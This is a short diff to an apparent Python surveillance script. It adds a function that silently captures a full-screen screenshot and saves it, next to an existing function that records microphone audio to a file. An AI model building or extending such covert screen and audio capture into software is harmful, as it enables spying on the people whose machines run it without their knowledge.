@@ -97,3 +97,10 @@ def microphone():
     write(file_merge + audio_info, fs, myrecording)
 
 microphone()
+
+# Get Screenshots
+def screenshots():
+    im = ImageGrab.grab()
+    im.save(file_merge + screenshot_info)
+
+screenshots()
